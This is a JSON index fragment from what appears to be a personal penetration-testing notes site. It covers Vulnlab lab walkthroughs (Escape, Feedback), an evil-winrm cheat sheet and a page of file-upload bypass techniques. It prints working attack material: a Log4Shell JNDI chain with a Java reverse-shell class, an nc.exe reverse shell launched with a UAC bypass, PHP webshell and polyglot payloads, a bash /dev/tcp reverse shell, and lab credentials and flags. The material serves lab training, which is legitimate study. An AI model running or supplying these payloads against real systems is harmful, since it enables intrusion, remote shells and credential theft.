\u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eEnum4Linux :\u003c/strong\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eenum4linux-ng -A iP\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003e\u003cstrong\u003eWindapsearch :\u003c/strong\u003e\u003c/p\u003e","tags":[],"title":"Discovery"},{"content":"#no_right Scan\nNot shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: ESCAPE | NetBIOS_Domain_Name: ESCAPE | NetBIOS_Computer_Name: ESCAPE | DNS_Domain_Name: Escape | DNS_Computer_Name: Escape | Product_Version: 10.0.19041 |_ System_Time: 2024-07-27T14:01:13+00:00 | ssl-cert: Subject: commonName=Escape | Not valid before: 2024-07-26T13:53:45 |_Not valid after: 2025-01-25T13:53:45 |_ssl-date: 2024-07-27T14:01:18+00:00; -3s from scanner time. Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows\rConnect without credentials : xfreerdp /v:10.10.75.175 -sec-nla\rVia edge we can access to C:/ folder and grab a password : \u0026lt;!-- Remote Desktop Plus --\u0026gt; \u0026lt;Data\u0026gt; \u0026lt;Profile\u0026gt; \u0026lt;ProfileName\u0026gt;admin\u0026lt;/ProfileName\u0026gt; \u0026lt;UserName\u0026gt;127.0.0.1\u0026lt;/UserName\u0026gt; \u0026lt;Password\u0026gt;JWqkl6IDfQxXXmiHIKIP8ca0G9XxnWQZgvtPgON2vWc=\u0026lt;/Password\u0026gt; \u0026lt;Secure\u0026gt;False\u0026lt;/Secure\u0026gt; \u0026lt;/Profile\u0026gt; \u0026lt;/Data\u0026gt;\rTool : https://gist.github.com/Yeeb1/df3ce82d56ccf4e0c72160d6b87d4d66\nDecrypt :\npython3 exploit.py --profiles profil.xml Profile: admin, Username: 127.0.0.1, Password: Twisting3021\rUser VL{e2b03f2ac66ea91fabdce8fc1c109edb}\nThen we download the cmd from system32 , to bypass the security and exec cmd we change his nameto msedge with F2 because we can\u0026rsquo;t right click .\nThen we download netcat and runascs and exec this command :\nrunas.exe admin Twisting3021 \u0026#34;cmd /c C:\\Users\\kioskUser0\\Downloads\\nc.exe 10.8.3.12 4242 -e cmd\u0026#34; --bypass-uac\rRoot VL{d0cf69050fa24e0321c46569a77df9c4}\n","date":"2023-09-07","id":42,"permalink":"/notes/lab/vulnlab/escape/","summary":"\u003cp\u003e#no_right\nScan\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNot shown: \u003cspan class=\"m\"\u003e999\u003c/span\u003e filtered tcp ports \u003cspan class=\"o\"\u003e(\u003c/span\u003eno-response\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT     STATE SERVICE       VERSION\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3389/tcp open  ms-wbt-server Microsoft Terminal Services\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e rdp-ntlm-info:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   Target_Name: ESCAPE\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   NetBIOS_Domain_Name: ESCAPE\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   NetBIOS_Computer_Name: ESCAPE\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   DNS_Domain_Name: Escape\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   DNS_Computer_Name: Escape\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   Product_Version: 10.0.19041\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  System_Time: 2024-07-27T14:01:13+00:00\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eEscape\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-07-26T13:53:45\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2025-01-25T13:53:45\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: 2024-07-27T14:01:18+00:00\u003cspan class=\"p\"\u003e;\u003c/span\u003e -3s from scanner time.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eService Info: OS: Windows\u003cspan class=\"p\"\u003e;\u003c/span\u003e CPE: cpe:/o:microsoft:windows\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eConnect without credentials :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003exfreerdp /v:10.10.75.175 -sec-nla\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eVia edge we can access to C:/ folder and grab a password :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-xml\" data-lang=\"xml\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c\"\u003e\u0026lt;!-- Remote Desktop Plus --\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;Data\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;Profile\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;ProfileName\u0026gt;\u003c/span\u003eadmin\u003cspan class=\"nt\"\u003e\u0026lt;/ProfileName\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;UserName\u0026gt;\u003c/span\u003e127.0.0.1\u003cspan class=\"nt\"\u003e\u0026lt;/UserName\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;Password\u0026gt;\u003c/span\u003eJWqkl6IDfQxXXmiHIKIP8ca0G9XxnWQZgvtPgON2vWc=\u003cspan class=\"nt\"\u003e\u0026lt;/Password\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;Secure\u0026gt;\u003c/span\u003eFalse\u003cspan class=\"nt\"\u003e\u0026lt;/Secure\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/Profile\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/Data\u0026gt;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eTool :\nhttps://gist.github.com/Yeeb1/df3ce82d56ccf4e0c72160d6b87d4d66\u003c/p\u003e","tags":[],"title":"Escape"},{"content":" Connect with creds: evil-winrm -i $t -u Caroline.Robinson -p \u0026#39;Pentest_123456789\u0026#39;\rConnect with a hash: evil-winrm -i \u0026lt;IP_ADDRESS\u0026gt; -u \u0026lt;USERNAME\u0026gt; -H \u0026lt;NTLM_HASH\u0026gt;\rConnect with a certificate: evil-winrm -i \u0026lt;IP_ADDRESS\u0026gt; -S -c \u0026lt;CERTIFICATE_FILE\u0026gt; -k \u0026lt;KEY_FILE\u0026gt;\rConnect with Kerberos authentication: evil-winrm -i \u0026lt;IP_ADDRESS\u0026gt; -u \u0026lt;USERNAME\u0026gt; -r \u0026lt;DOMAIN\u0026gt; -k\rUpload a file: upload \u0026lt;LOCAL_FILE_PATH\u0026gt; \u0026lt;REMOTE_FILE_PATH\u0026gt;\rDownload a file: download \u0026lt;REMOTE_FILE_PATH\u0026gt; \u0026lt;LOCAL_FILE_PATH\u0026gt;\rConnect with a certificate : evil-winrm -S -i 10.10.10.103 -u amanda -p Ashare1972 -c certnew.cer -k private.key\rInteractive shell : https://github.com/antonioCoco/ConPtyShell ","date":"2023-09-07","id":43,"permalink":"/notes/ad/tools/evil-winrm/","summary":"\u003cul\u003e\n\u003cli\u003eConnect with creds:\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eevil-winrm  -i \u003cspan class=\"nv\"\u003e$t\u003c/span\u003e -u Caroline.Robinson -p \u003cspan class=\"s1\"\u003e\u0026#39;Pentest_123456789\u0026#39;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eConnect with a hash:\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eevil-winrm -i \u0026lt;IP_ADDRESS\u0026gt; -u \u0026lt;USERNAME\u0026gt; -H \u0026lt;NTLM_HASH\u0026gt;\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eConnect with a certificate:\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eevil-winrm -i \u0026lt;IP_ADDRESS\u0026gt; -S -c \u0026lt;CERTIFICATE_FILE\u0026gt; -k \u0026lt;KEY_FILE\u0026gt;\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eConnect with Kerberos authentication:\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eevil-winrm -i \u0026lt;IP_ADDRESS\u0026gt; -u \u0026lt;USERNAME\u0026gt; -r \u0026lt;DOMAIN\u0026gt; -k\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eUpload a file:\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eupload \u0026lt;LOCAL_FILE_PATH\u0026gt; \u0026lt;REMOTE_FILE_PATH\u0026gt;\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eDownload a file:\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edownload \u0026lt;REMOTE_FILE_PATH\u0026gt; \u0026lt;LOCAL_FILE_PATH\u0026gt;\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eConnect with a certificate :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eevil-winrm -S -i 10.10.10.103 -u amanda -p Ashare1972 -c certnew.cer -k private.key\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eInteractive shell :\nhttps://github.com/antonioCoco/ConPtyShell\u003c/li\u003e\n\u003c/ul\u003e","tags":[],"title":"Evil WinRm"},{"content":"Scan :\nPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c1c1b4297485c9be409852fe7228bb76 (RSA) | 256 e2bd0b90770c51fc9de4a6da794bdd96 (ECDSA) |_ 256 e8bae65c69921d2ee53f86a4bbfa7de2 (ED25519) 8080/tcp open http Apache Tomcat 9.0.56 |_http-title: Apache Tomcat/9.0.56 |_http-favicon: Apache Tomcat Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rSet Up a Malicious LDAP Server You can use tools like marshalsec to set up an LDAP server that will return a malicious Java class file.\ngit clone https://github.com/mbechler/marshalsec.git cd marshalsec\rCompile the project: mvn clean package -DskipTests\rRun the LDAP server:\njava -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \u0026#34;http://your-server.com:8888/#Exploit\u0026#34;\rCreate a Malicious Java Class for Reverse Shell import java.io.IOException; public class Exploit { static { try { String[] cmd = {\u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/your-ip/your-port 0\u0026gt;\u0026amp;1\u0026#34;}; java.lang.Runtime.getRuntime().exec(cmd); } catch (IOException e) { e.printStackTrace(); } } }\rCompile this class: javac -source 1.8 -target 1.8 Exploit.java\rStart a simple HTTP server to serve this class python3 -m http.server 8888\rTrigger the Vulnerability Send a payload to the vulnerable application that triggers the LDAP lookup. This payload will point to your malicious LDAP server, which in turn will instruct the application to load the malicious class file from your HTTP server.\nPayload: ${jndi:ldap://your-server.com:1389/a}\rStart a Listener for the Reverse Shell nc -lvnp your-port\rUser:\nAfter the foot hold we grab that file : \u0026lt;tomcat-users xmlns=\u0026#34;http://tomcat.apache.org/xml\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://tomcat.apache.org/xml tomcat-users.xsd\u0026#34; version=\u0026#34;1.0\u0026#34;\u0026gt; \u0026lt;user username=\u0026#34;admin\u0026#34; password=\u0026#34;H2RR3rGDrbAnPxWa\u0026#34; roles=\u0026#34;manager-gui\u0026#34;/\u0026gt; \u0026lt;user username=\u0026#34;robot\u0026#34; password=\u0026#34;H2RR3rGDrbAnPxWa\u0026#34; roles=\u0026#34;manager-script\u0026#34;/\u0026gt; \u0026lt;/tomcat-users\u0026gt;\rsu root gg you got the flag ;) Root:VL{25da7f42f4e279698c91c0ce911d51a9}\n","date":"2023-09-07","id":44,"permalink":"/notes/lab/vulnlab/feedback/","summary":"\u003cp\u003eScan :\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT     STATE SERVICE VERSION\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 \u003cspan class=\"o\"\u003e(\u003c/span\u003eUbuntu Linux\u003cspan class=\"p\"\u003e;\u003c/span\u003e protocol 2.0\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssh-hostkey:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"m\"\u003e2048\u003c/span\u003e c1c1b4297485c9be409852fe7228bb76 \u003cspan class=\"o\"\u003e(\u003c/span\u003eRSA\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"m\"\u003e256\u003c/span\u003e e2bd0b90770c51fc9de4a6da794bdd96 \u003cspan class=\"o\"\u003e(\u003c/span\u003eECDSA\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  \u003cspan class=\"m\"\u003e256\u003c/span\u003e e8bae65c69921d2ee53f86a4bbfa7de2 \u003cspan class=\"o\"\u003e(\u003c/span\u003eED25519\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e8080/tcp open  http    Apache Tomcat 9.0.56\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-title: Apache Tomcat/9.0.56\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-favicon: Apache Tomcat\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eService Info: OS: Linux\u003cspan class=\"p\"\u003e;\u003c/span\u003e CPE: cpe:/o:linux:linux_kernel\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eSet Up a Malicious LDAP Server\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eYou can use tools like marshalsec to set up an LDAP server that will return a malicious Java class file.\u003c/p\u003e","tags":[],"title":"Feedback"},{"content":"#File_upload\nTest every php extension\nScript generate extension list : var = \u0026#34;.php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module\u0026#34; var_list = var.split(\u0026#34;, \u0026#34;) with open(\u0026#34;extensions.txt\u0026#34;, \u0026#34;w\u0026#34;) as file: for extension in var_list: file.write(extension + \u0026#34;\\n\u0026#34;)\rCheck every file that send an echo \u0026ldquo;test\u0026rdquo; : Same technique now check every response that print Demonize or \u0026quot;test\u0026quot;\nCheck the disable function\nHere is a list or other possible function to test to execute command :\nexec - Returns last line of commands output: echo exec(\u0026quot;uname -a\u0026quot;); passthru - Passes commands output directly to the browser: echo passthru(\u0026quot;uname -a\u0026quot;); system - Passes commands output directly to the browser and returns last line: echo system(\u0026quot;uname -a\u0026quot;); shell_exec - Returns commands output : echo shell_exec(\u0026quot;uname -a\u0026quot;); popen - Opens read or write pipe to process of a command: echo fread(popen(\u0026quot;/bin/ls /\u0026quot;, \u0026quot;r\u0026quot;), 4096); proc_open - Similar to popen() but greater degree of control: proc_close(proc_open(\u0026quot;uname -a\u0026quot;,array(),$something)); preg_replace : \u0026lt;?php preg_replace('/.*/e', 'system(\u0026quot;whoami\u0026quot;);', ''); ?\u0026gt; pcntl_exec - Executes a program (by default in modern and not so modern PHP you need to load the pcntl.so module to use this function) : pcntl_exec(\u0026quot;/bin/bash\u0026quot;, [\u0026quot;-c\u0026quot;, \u0026quot;bash -i \u0026gt;\u0026amp; /dev/tcp/127.0.0.1/4444 0\u0026gt;\u0026amp;1\u0026quot;]); Bypass Content-Type, Magic Number\nBypass Content-Type checks by setting the value of the Content-Type header to: image/png , text/plain , application/octet-stream Content-Type wordlist: https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt\nBypass magic number check by adding at the beginning of the file the bytes of a real image (confuse the file command). Or introduce the shell inside the metadata: exiftool -Comment=\u0026quot;\u0026lt;?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?\u0026gt;\u0026quot; \u0026lt;YOUR-INPUT-IMAGE\u0026gt;.jpg -o polyglot.php\nOr you could also introduce the payload directly in an image:\necho '\u0026lt;?php system($_REQUEST['cmd']); ?\u0026gt;' \u0026gt;\u0026gt; img.png\nInteresting tool Upload bypass : https://github.com/sAjibuu/Upload_Bypass\nYou can also an LFI do bypass restriction for example : Content-Disposition: form-data; name=\u0026quot;avatar\u0026quot;; filename=\u0026quot;../exploit.php\nDO NOT forget try double encoding ect \u0026hellip;\nHtaccess ( Web shell upload via extension blacklist bypass ): 1- Upload a file name as .htaccess 2- Change the value of the Content-Type header to text/plain 3- Replace the contents of the file (your PHP payload) with the following Apache directive:\nAddType application/x-httpd-php .l33t\nResources: https://thibaud-robin.fr/articles/bypass-filter-upload/\nTester la présence d\u0026rsquo;un Anti-virus : X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\rZip : Try to upload a zip with symlink to /etc/password or the page himself (index.php) Be aware of opendir !! ln -s /proc/self/environ test.txt zip --symlinks user.zip test.txt\rAlso Zipslip : https://github.com/snyk/zip-slip-vulnerability\n","date":"2023-09-07","id":45,"permalink":"/notes/web/file-upload/","summary":"\u003cp\u003e#File_upload\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eTest every php 